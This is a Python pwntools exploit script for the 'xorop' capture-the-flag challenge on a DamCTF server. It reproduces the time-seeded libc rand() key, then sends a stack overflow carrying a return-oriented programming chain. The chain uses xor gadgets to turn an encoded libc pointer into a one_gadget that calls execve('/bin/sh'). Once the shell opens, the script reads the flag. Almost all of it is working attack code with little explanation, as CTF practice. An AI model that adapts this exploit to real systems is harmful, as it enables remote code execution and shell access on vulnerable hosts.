#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
from pwn import *
from ctypes import CDLL
from math import *

libc = CDLL("libc.so.6")


context.log_level = 'info'
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=-2', '--geometry=128x98+1100+0', '-e']

#setting
do_remote = 1
remote_host = 'chals.damctf.xyz'
remote_port = 31228
challenge_exe = "./xorop"
DEBUG = 0

context(arch = 'amd64', os = 'linux', endian="little")

puts_plt = 0x000000000400620


gadget3 = 0x400708	# xor    QWORD PTR [rdi],rsi / add    rdi,0x8 / cmp    rdx,rdi / ja     400708 / ret
gadget4 = 0x000000000040088f  # pop rdi ; ret
gadget5 = 0x000000000040088d  # pop rsi ; pop r15 ; ret
gadget6 = 0x400890		# ret

now = int(floor(time.time()))

if do_remote == 1:
  p = connect(remote_host, remote_port)
else:
  if DEBUG:
    p = gdb.debug([challenge_exe] , env={'LD_PRELOAD':'./libc.so.6'}, gdbscript = '''
    source /home/interzone/gdb.plugins/gef/gef.py
    b main
    b *read_input+259
    continue
     ''')
  else:
    p = process(challenge_exe, env={'LD_PRELOAD':'./libc.so.6'})

p.sendafter('continue.\n', '\x00')

#now = int(floor(time.time()))
libc.srand(now)
info('now = '+str(now))

key = libc.rand()
if (key & 0x80000000):
  key = (0xffffffff80000000 | (key & 0x7fffffff))
nrand = libc.rand()
if (nrand & 0x80000000): 
  nrand = (0xffffffff80000000 | (nrand & 0x7fffffff) )
key = key ^ (nrand<<21)
key = (key ^ (libc.rand()<<42))&0xffffffffffffffff

negkey = (0 - (key + 0x316cb ))&0xffffffffffffffff      # 0x4f365 execve("/bin/sh", rsp+0x40, environ)


info('my key = '+hex(key)+'  (negkey = '+hex(negkey)+')')

# we use xor gadget to change the key to it's negative + offset of (onegadget - puts) in libc
payload = p64(gadget4) + p64(0x600c38)
payload += p64(gadget5) + p64(key ^ negkey) + p64(0)
payload += p64(gadget3)
# we return to the program that encode the libc addresses in .bss, but this time it will decode them with the negative key
payload += p64(0x4007d4)
payload += p64(0)*9
# we add a gadget to align the stack
payload += p64(gadget6)
# then we jump to the one_gadget (which is in puts@got now)
payload += p64(puts_plt)


p.sendlineafter('memfrob?\n', p64(0) + p64(0xdeadbeef)*7 + p64(negkey & 0xffffffff) + payload)
p.readuntil('4 u.\n')

p.sendline('/bin/sh 1>&3')
p.sendline('cat flag')

p.interactive()

